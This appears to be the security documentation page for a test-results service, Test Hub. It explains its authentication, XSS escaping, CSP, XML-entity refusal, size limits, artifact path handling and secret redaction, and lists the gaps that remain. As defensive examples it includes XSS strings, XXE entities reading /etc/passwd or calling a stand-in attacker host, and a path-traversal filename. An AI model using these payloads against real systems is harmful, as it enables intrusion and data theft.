# Security

[SECURITY.md](../SECURITY.md) is the policy: how to report something, what is in
scope, what to expect. This page is the engineering companion — where each
control actually lives, how to verify it on your own instance in one command,
and, in the last section, what Test Hub deliberately does **not** protect against
in this release. That last section is the one worth reading before you deploy.

Everything shown below was run against Test Hub 0.1.0.

## The shape of the problem

Two facts drive every decision here.

**Test Hub's primary input is untrusted text that it renders in a browser.** A
failure message is whatever the test printed: an assertion diff, an HTTP response
body, a stack trace, a fragment of HTML the code under test produced, the
connection string it failed to connect with. It arrives from CI, from
repositories nobody on the Test Hub side reviews, and it is stored, indexed,
shown to humans and written into exported HTML files that get attached to
tickets.

**The default deployment is unauthenticated and bound to loopback, and that
pairing is load-bearing.** Test Hub does not have a mode where it listens on a
network with no authentication unless a human typed a flag that says so.

## Binding

<a id="binding"></a>

`Settings.check_bind_safety()` in `src/test_hub/config.py` is the single gate,
called by `serve` before the socket is opened and again in the app's lifespan.
It refuses rather than warns:

```shell
$ test-hub serve --host 0.0.0.0 --port 8199
error: refusing to bind 0.0.0.0:8199 with no authentication. Create a token with
`test-hub token create`, set TEST_HUB_API_TOKEN_HASHES, or pass
--insecure-no-auth if this really is a throwaway development host.
  host: 0.0.0.0
  port: 8199
$ echo $?
78
```

78 is `EX_CONFIG`, so a supervisor can tell a misconfiguration apart from a
crash and stop restarting it.

Loopback detection is `ipaddress.ip_address(host).is_loopback` plus the literals
`localhost` and `::1` — the whole `127.0.0.0/8` range, not just `127.0.0.1`.

The opt-out is loud, on every start, in two places:

```shell
$ test-hub serve --host 0.0.0.0 --port 8199 --insecure-no-auth
01:38:40 WARNING test_hub.cli.commands.serve  AUTHENTICATION IS DISABLED and Test Hub is
    bound to 0.0.0.0:8199. Anyone who can reach this port can read and write every test result.
  auth      DISABLED on a public interface
01:38:40 WARNING test_hub.api.app             AUTHENTICATION IS DISABLED and Test Hub is
    bound to 0.0.0.0:8199. …
```

Configuring any token flips `auth_enabled` on by itself
(`Settings._auth_follows_exposure`), so the failure mode of "I set a token and
forgot to enable auth" does not exist.

`check_bind_safety()` also warns — without refusing — when
`cors_allow_origins` contains `*`, because any website a user visits could then
read this API from their browser.

## Tokens

`src/test_hub/api/security.py`. Only hashes are stored:
`pbkdf2_sha256$<iterations>$<salt-hex>$<hash-hex>`, 120 000 iterations of
PBKDF2-HMAC-SHA256 with a 16-byte salt, compared with `hmac.compare_digest`.

A KDF rather than a bare SHA-256 is a deliberate choice for a specific mistake:
the tokens Test Hub generates carry 256 bits of entropy and a plain digest would
be fine for them, but nothing stops an operator setting
`TEST_HUB_API_TOKENS=letmein`. PBKDF2 makes that expensive to exploit instead of
free. To keep 120 000 iterations off the request path, a successful verification
is memoized for the life of the process on a SHA-256 fingerprint of the presented
token, so the KDF runs once per distinct token rather than once per request; the
rejection set is capped at 4096 entries so a flood of bad tokens cannot grow the
process without limit.

```shell
$ test-hub token create --label ci

  Token (shown once — copy it now)
  ths_930NYCSZN-jva--X3gJWFk2Sst-esPPNs7O8rsmQ-P4

  Configure the server with the hash, not the token:
  export TEST_HUB_API_TOKEN_HASHES="pbkdf2_sha256$120000$a98cad7071abf1fd43739cf0827bbb8a$74872c1d8e0b249632f78199d9a9d23900e03ae7bbe16775585101177d96d214"
```

The `ths_` prefix costs four characters and buys recognition by a secret scanner
and by a human reading a log.

**A token is never accepted as a command-line argument.** There is no `--token`
flag anywhere; `test-hub publish` takes `--token-env` or `--token-file`, and
`test-hub token hash` reads from the environment. argv is world-readable in `ps`
to every user on the machine, lands in shell history, and CI systems routinely
echo the command they are about to run.

Both header forms are the same token and the same check:

```shell
$ curl -s -o /dev/null -w '%{http_code}\n' -X POST $HUB/api/v1/imports \
    -H "Authorization: Bearer $TOK" -F file=@results.xml -F project=p
201
$ curl -s -o /dev/null -w '%{http_code}\n' -X POST $HUB/api/v1/imports \
    -H "X-API-Key: $TOK" -F file=@results.xml -F project=p
201
$ curl -s -X POST $HUB/api/v1/imports -F file=@results.xml -F project=p
{"error":"unauthorized","message":"a valid bearer token is required; send it as `Authorization: Bearer <token>` or `X-API-Key: <token>`"}
```

`X-API-Key` exists because several CI systems make it awkward to set an
`Authorization` header on a generic HTTP step. It is not a weaker credential —
but note that a header named `X-API-Key` is more likely to be logged verbatim by
an intermediary than `Authorization`, which most proxies and log pipelines
already know to redact. Prefer `Bearer` where you have the choice.

A missing, malformed and wrong token all produce the same 401 and the same
message. Which of the three it was is free information for an attacker.

Rotation is additive: `TEST_HUB_API_TOKEN_HASHES` is a list, so add the new hash,
roll the publishers, then remove the old one. No downtime, no window where both
are invalid.

## Untrusted test output in a browser

The dashboard's rule, enforced by review: **no `innerHTML` with interpolated
data.** Text goes in with `textContent`, structure with `document.createElement`.

The interesting boundary is the offline export, where the entire data set is
embedded *inside* a `<script>` element. `embed_json` in
`src/test_hub/export/snapshot.py` rewrites `<`, `>`, `&`, U+2028 and U+2029 as
JSON `\uXXXX` escapes before serialization:

```shell
$ python -c "from test_hub.export.snapshot import embed_json; \
             print(embed_json({'name': '</script><img src=x onerror=alert(1)>'}))"
{"name": "</script><img src=x onerror=alert(1)>"}
```

No byte sequence in test data can spell `</script` and terminate the element the
data lives in. Because these are JSON escapes rather than HTML entities, the
value the browser parses back is byte-for-byte the value that was serialized:

```shell
$ python -c "import json; from test_hub.export.snapshot import embed_json; \
             print(json.loads(embed_json({'name': '</script><img src=x onerror=alert(1)>'}))['name'])"
</script><img src=x onerror=alert(1)>
```

U+2028 and U+2029 matter because they are legal inside a JSON string and illegal
inside a JavaScript one — a stack trace containing either would turn the whole
snapshot into a syntax error, which is a denial of service on a report you
already emailed to someone.

`tests/test_snapshot_embedding.py` runs eleven real breakout payloads through
both properties — nothing escapes, and every value survives exactly.

The adapters carry payloads through verbatim rather than sanitizing them.
Importing `tests/fixtures/junit/html-injection.xml` stores test names that read:

```
'escapes <script>alert(1)</script> in the product title'
'escapes </script><img src=x onerror=alert(1)> in the coupon code'
'escapes "><b> in the search box'
```

That is correct. Those are legitimate names for a suite that tests output
escaping, and an adapter that mangled them would make the suite untestable. The
escaping belongs at the point of rendering, not the point of parsing.

### CSP

Sent on every response, including the static dashboard and the OpenAPI docs, by
raw-ASGI middleware in `src/test_hub/api/app.py`. Verified on the wire:

```
content-security-policy: default-src 'none'; script-src 'self'; style-src 'self';
  img-src 'self' data:; font-src 'self'; connect-src 'self'; form-action 'none';
  frame-ancestors 'none'; base-uri 'none'
x-content-type-options: nosniff
x-frame-options: DENY
referrer-policy: no-referrer
cross-origin-opener-policy: same-origin
permissions-policy: camera=(), microphone=(), geolocation=(), payment=()
```

No `unsafe-inline`, no `unsafe-eval`, no remote origin. That policy is only
possible because the frontend ships no inline script, no inline style and loads
nothing from a CDN — which is the security half of ADR-0001 D7. If you ever find
yourself loosening the CSP to make a feature work, the feature is wrong.

The middleware is written as raw ASGI rather than `BaseHTTPMiddleware` because
the latter buffers responses, which would defeat the SSE endpoint entirely.

**The exported snapshot carries no CSP.** It is a single `file://` document; a
`<meta>` policy would be weaker than a header, and under `default-src 'none'`
self-defeating for a file whose script and style are inline by construction. In
the export, `embed_json` and the no-`innerHTML` rule are not defence in depth —
they are the whole defence. That is why both are enforced where the data is
written rather than where it is displayed.

## XML entity attacks

All XML parsing goes through `defusedxml.ElementTree.iterparse`. DTDs, entity
declarations and external references are refused before anything is expanded.
Two fixtures keep it that way, and both currently produce the same refusal:

```shell
$ curl -s -X POST $HUB/api/v1/imports -F file=@tests/fixtures/junit/billion-laughs.xml -F project=sec
{"error":"adapter_error","message":"this XML declares a DTD or entities and was refused before it
was expanded. Entity expansion is how an 'XML bomb' turns a 200-byte upload into gigabytes of
memory, and how an XXE reads files off the server, so Test Hub never processes it. Re-export the
report without a DOCTYPE.","detail":{"reason":"DTDForbidden"}}   [422]

$ curl -s -X POST $HUB/api/v1/imports -F file=@tests/fixtures/junit/xxe.xml -F project=sec
{"error":"adapter_error","message":"this XML declares a DTD or entities …","detail":{"reason":"DTDForbidden"}}   [422]
```

`xxe.xml` contains `<!ENTITY xxe SYSTEM "file:///etc/passwd">` and
`<!ENTITY remote SYSTEM "http://attacker.invalid/collect?c=1">`, referenced from
a `<failure>` message and body. Neither is resolved: the DOCTYPE is rejected
before the document body is read at all.

Note the refusal is *categorical*. A report with a legitimate DOCTYPE — there is
no such thing in practice for JUnit XML — is also refused. Refusing a DOCTYPE is
much easier to reason about than allowing one and trying to constrain what it can
do.

**The contributor rule:** `xml.etree`, `lxml` and `minidom` must not appear in an
import statement anywhere under `src/`. There is no trusted XML input here, so
there is no exception for "internal" files.

`defusedxml` is a hard runtime dependency in `pyproject.toml`, not an extra, for
exactly this reason.

## Size and decompression limits

Every limit is enforced **while streaming**, never after buffering. Checking
`Content-Length` is advisory, and reading a file first and measuring it
afterwards is precisely the denial of service the limit exists to prevent.
`read_bounded()` in `src/test_hub/service/imports.py` counts bytes as they arrive
and aborts the moment the count is exceeded; `FilesystemArtifactStore.put()` does
the same and unlinks its partial temp file on the way out.

| Setting | Default | Guards |
|---|---|---|
| `TEST_HUB_MAX_REPORT_BYTES` | 64 MiB | The uploaded report, before decompression. |
| `TEST_HUB_MAX_DECOMPRESSED_BYTES` | 512 MiB | What a compressed upload may expand to. |
| `TEST_HUB_MAX_ARTIFACT_BYTES` | 128 MiB | One attached artifact. |
| `TEST_HUB_MAX_TEXT_FIELD_BYTES` | 256 KiB | One stack trace or log body. Longer text is truncated *and the attempt is flagged*, never silently cut. |
| `TEST_HUB_MAX_EVENTS_PER_BATCH` | 5000 | One `POST /runs/{id}/events` batch. |

```shell
$ # a server started with TEST_HUB_MAX_REPORT_BYTES=2048, against a 2496-byte file
$ curl -s -X POST $HUB/api/v1/imports -F file=@tests/fixtures/junit/simple.xml -F project=p
{"error":"payload_too_large","message":"report exceeds the 2048 byte limit
(TEST_HUB_MAX_REPORT_BYTES); split the upload or raise the limit","detail":{"limit_bytes":2048}}   [413]
```

`WarningCollector` applies the same idea to the *response*: 500 warnings maximum,
then a count of what was dropped. A pathological file produces a bounded reply.

Two honest gaps. First, `max_decompressed_bytes` is defined and validated but the
built-in adapters do not decompress anything — neither accepts a `.gz` or `.zip`
upload — so the setting is a promise to a future adapter rather than an active
control today. Second, the report is read into memory (a bounded `BytesIO`)
because auto-detection needs to rewind the stream; with the default limit that is
up to 64 MiB per concurrent import, so if you raise it, raise it knowing that.

## Artifact paths

`src/test_hub/storage/artifacts.py`. The only value in that module ever allowed
to become a path is a validated 64-character lowercase hex digest:

```python
_SHA256_RE = re.compile(r"^[0-9a-f]{64}$")
```

Blobs live at `<root>/<aa>/<bb>/<sha256>`. A SHA-256 hex digest cannot contain a
separator, a dot segment, a colon, a drive letter or a non-ASCII byte, so **the
name a publisher supplied never touches the filesystem**. It is a database column
and a `Content-Disposition` value, which makes it a display problem rather than a
filesystem one.

The name is still cleaned, in two layers with deliberately different behaviour:

- `service.runs.safe_artifact_name()` — a best-effort *repair*, applied on the
  upload path. Strips separators, NULs, CR/LF and quotes; replaces `..`; prefixes
  a Windows device name with `_`.
- `storage.artifacts.sanitize_artifact_name()` — a *refusal*, applied in the
  store. A separator, a `..`, a NUL or a device name is a `ValidationError`, not
  a rewrite. A store that silently turned `../../etc/passwd` into `passwd` would
  hand the next component a name its author never wrote and make the guarantee
  impossible to test.

The upload path repairs first, so the API answers 201 with a mangled name rather
than 422:

```shell
$ curl -sX POST "$HUB/api/v1/runs/$RUN/artifacts" \
    -F 'file=@shot.png;filename=../../../../etc/cron.d/evil'
stored name: '____etccron.devil'

$ curl -sX POST "$HUB/api/v1/runs/$RUN/artifacts" -F 'file=@shot.png;filename=CON.png'
stored name: '_CON.png'
```

Ugly, and safe, and it is the label only — the bytes went to
`artifacts/4a/8b/4a8bc502…`.

Downloads are always `Content-Disposition: attachment`, always the stored content
type, and always `X-Content-Type-Options: nosniff`. An artifact is
attacker-supplied content served from Test Hub's own origin; rendering it inline
would hand any publisher a stored XSS on the dashboard's domain.

Blobs are content-addressed rather than run-scoped, so an unreferenced blob is
left on disk when the row that pointed at it rolls back. It is deduplicated and
harmless, and deleting it would be wrong the moment two runs share it. There is
no garbage collector in this release — see the gaps below.

## Secret redaction

`Redactor` in `src/test_hub/logging.py`, applied on the way **in**: to log
records through a filter installed on Test Hub's handler, and to the failure
text, stdout, stderr, logs and skip reason of every attempt as it is folded into
a row (`src/test_hub/storage/repositories.py`, `_on_test_finished` and
`_failure_json`). Redacted-in means a secret is not in the database, not in the API
response and not in the export — not merely hidden in one view.

Each pattern must have exactly one capturing group, and only the group is
replaced, so the key stays readable:

```shell
$ # a JUnit report whose <failure> body contains real-looking credentials
$ curl -s "$HUB/api/v1/runs/$R" | jq -r '.tests[0].attempts[0].failure.stack_trace'
Request headers: Authorization: ***REDACTED*** ***REDACTED***
DSN: postgresql://app:***REDACTED***@db.internal:5432/app
config: api_key=***REDACTED***

$ curl -s "$HUB/api/v1/runs/$R" | jq -r '.tests[0].attempts[0].stdout'
AWS_ACCESS_KEY_ID=AKIA***REDACTED***
```

The defaults in `DEFAULT_REDACTION_PATTERNS` cover `Bearer` and `Basic`
credentials, PEM private-key blocks, database URLs with an inline password
(`postgres`, `postgresql`, `mysql`, `mongodb`, `redis`, `amqp`), AWS access key
ids, GitHub `ghp_` tokens, Slack `xox*` tokens, JWTs, and a generic `key=value`
rule for `api_key`, `apikey`, `access_key`, `token`, `secret`, `password`,
`passwd`, `pwd`, `authorization`, `auth_token`, `private_key` and
`client_secret`.

Note the first line above: `Authorization: Bearer <token>` loses **both** the
token (to the `bearer` pattern) and the word `Bearer` (to the generic
`authorization:` rule that runs after it). The source comment predicts only the
first. It is more aggressive than intended and no less safe.

### Adding your own

Every organisation has one secret shape the defaults have never seen.
`TEST_HUB_REDACTION_PATTERNS` **replaces** the defaults rather than extending
them, so include the ones you still want. Both a comma-separated string and a
JSON array are accepted:

```shell
$ TEST_HUB_REDACTION_PATTERNS='(?i)\bacme_([A-Za-z0-9]+)' test-hub serve
```

**The trap: a comma inside a pattern.** The comma-separated form splits on every
comma, including the one in a `{8,64}` quantifier, and the result does not
compile:

```shell
$ TEST_HUB_REDACTION_PATTERNS='(?i)tok_([A-Za-z0-9]{8,64})' python -c "from test_hub.config import Settings; Settings()"
ValidationError: Value error, invalid redaction pattern '(?i)tok_([A-Za-z0-9]{8':
  missing ), unterminated subpattern at position 8
```

Use the JSON-array form for any pattern containing a comma:

```shell
$ TEST_HUB_REDACTION_PATTERNS='["(?i)tok_([A-Za-z0-9]{8,64})"]' python -c "
from test_hub.config import Settings; from test_hub.logging import Redactor
print(Redactor(Settings().redaction_patterns).redact('tok_ABCDEFGHIJKL rest'))"
tok_***REDACTED*** rest
```

The failure is loud — the process refuses to start — which is the right way round,
but the message names the regex rather than the comma, so it is worth knowing in
advance. A pattern with no capturing group is silently ignored by `Redactor`
rather than applied, so make sure yours has one.

`TEST_HUB_REDACTION_ENABLED=false` turns the whole thing off. There is one
legitimate reason to do that — you have an external scrubber in front — and
several bad ones.

**The honest limitation.** Redaction is regular expressions over arbitrary text.
It is a strong second line of defence and it is not a guarantee. A base64 blob
with no surrounding keyword, a secret split across two lines, a bespoke token
format — these get through. Do not treat Test Hub as a place secrets cannot
reach. Treat it as a system that reduces the damage when they do, and fix the
leak at the test.

## What Test Hub does not protect against

This is the most useful section on the page. None of the following is a
vulnerability; all of it is missing, on purpose, in 0.1.0.

**There is no authorization, only authentication.** A token is a token. Every
valid token can read everything and write everything: every project, every team,
every run. A token you gave to a contractor's pipeline to publish one project's
results can read the whole workspace and can post results attributed to any
project it likes. There is no per-project scope, no read-only token, no service
account, no ownership check anywhere in the codebase. `AuthorizationError` (403)
exists in the taxonomy and is never raised. If some results must not be visible
to some publishers, run a second Test Hub.

**There is one workspace, and it is not a tenancy boundary.** Every row carries
`workspace_id` from the first migration — that is ADR-0001 D9, so the column
never has to be added to a populated events table later — but the OSS edition
creates exactly one workspace, derives its id from the slug, and offers no way to
create or select another. `require_read`/`require_write` do not consider the
workspace at all. Treat the schema column as future-proofing, not as isolation.

**Publisher identity is not verified.** A run's `project_key`, `team`, `branch`,
`commit` and `pipeline_url` are whatever the publisher typed. Nothing checks that
the token used belongs to that project, or that the branch exists, or that the
CI job is real. Anyone with a token can publish a green run for `payments-api`
that never ran.

**There is no audit log.** Nothing records which token wrote which run, when, or
from where. The `EventRow` table records `source` — a publisher-supplied string
that anyone can set to anything — and `received_at`. Uvicorn's access log is
switched off by default (`access_log=False`, because it duplicates Test Hub's own
logging and is noisy in a terminal that is also showing test output). If you need
to know who did what, put a reverse proxy in front and keep *its* log.

**There is no rate limiting.** No per-token quota, no per-IP throttle, no
concurrency cap on imports. A publisher in a retry loop is limited only by the
size caps and by SQLite's single-writer ceiling, which under load means everyone
else's imports queue behind it (see [Scaling](scaling.md)). If the port is
reachable by anything you do not control, put a rate limit in the proxy.

**There is no data retention, expiry or deletion.** No endpoint deletes a run, a
project or an artifact; nothing ages data out; there is no artifact garbage
collector, so a blob whose rows rolled back stays on disk forever. Storage grows
monotonically. Plan a volume, or plan to `rm` the data directory.

**Nothing is encrypted at rest.** The SQLite file and the artifact tree are plain
files. `ensure_directories()` chmods the data directory to `0700` and blobs to
`0600` where the platform supports it, which stops another *unprivileged* user on
the same host — nothing more. Use an encrypted volume if the disk matters.

**Test Hub speaks plain HTTP.** There is no TLS listener and no plan for one;
terminate TLS in front of it. A bearer token sent over plain HTTP across a
network is a token you have given away. The Compose file publishes to `127.0.0.1`
for exactly this reason.

**A token, once issued, cannot be revoked from inside Test Hub.** There is no
token store, no `test-hub token revoke`, no expiry. Revocation means editing
`TEST_HUB_API_TOKEN_HASHES` and restarting the process.

**`--insecure-no-auth` on a public interface is a deployment decision, not a
vulnerability.** It warns on every start and banners the dashboard. If you use it
anyway, anyone who can reach the port can read and write every test result.

**Anyone who can write to `TEST_HUB_DATA_DIR` or the environment already owns the
process.** Redaction patterns, token hashes and the CSP all come from
configuration; a person who can change that can turn any of them off.

## Verifying a deployment

Five commands, from a machine that is *not* the server:

```shell
# 1. Auth is on and writes are closed.
curl -s -o /dev/null -w '%{http_code}\n' -X POST https://test-hub.internal/api/v1/runs \
  -H 'content-type: application/json' -d '{"project_key":"probe"}'      # expect 401

# 2. TLS terminates in front, and the security headers survive the proxy.
curl -sI https://test-hub.internal/ | grep -Ei 'content-security-policy|x-frame|nosniff'

# 3. Entity expansion is refused.
printf '<?xml version="1.0"?><!DOCTYPE t [<!ENTITY x SYSTEM "file:///etc/passwd">]><testsuites/>' \
  > /tmp/xxe.xml
curl -s -X POST https://test-hub.internal/api/v1/imports -H "Authorization: Bearer $TOK" \
  -F file=@/tmp/xxe.xml -F project=probe                                # expect DTDForbidden

# 4. Reads are as open or as closed as you intended.
curl -s -o /dev/null -w '%{http_code}\n' https://test-hub.internal/api/v1/runs

# 5. Your own secret shapes are redacted before storage. Publish a report whose
#    failure text contains a dummy credential in your format, then read it back:
curl -s "https://test-hub.internal/api/v1/runs/$RUN" | grep -c 'REDACTED'
```

If (1) returns 201, stop and read [Binding](#binding).
